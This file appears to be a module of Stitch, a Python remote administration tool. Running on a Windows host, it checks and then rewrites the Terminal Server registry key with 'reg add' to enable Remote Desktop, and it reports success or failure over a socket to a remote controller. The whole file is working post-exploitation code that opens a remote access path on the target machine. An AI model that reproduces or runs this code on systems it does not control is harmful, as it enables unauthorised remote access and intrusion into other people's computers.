# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import sys
import _winreg
import subprocess

def enable_rdp():
    return run_command('reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')

def check_rdp():
    rdp_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\Terminal Server')
    val=_winreg.QueryValueEx(rdp_key, "fDenyTSConnections")
    if val[0] == 0:
        return True
    else:
        return False

if not check_rdp():
    enable_rdp()
    if check_rdp():
        send(client_socket, "[+] RDP is now Enabled\n")
    else:
        send(client_socket, "[!] Failed to enable RDP, RDP is still Disabled\n")
else:
    send(client_socket, "[*] RDP is already Enabled\n")
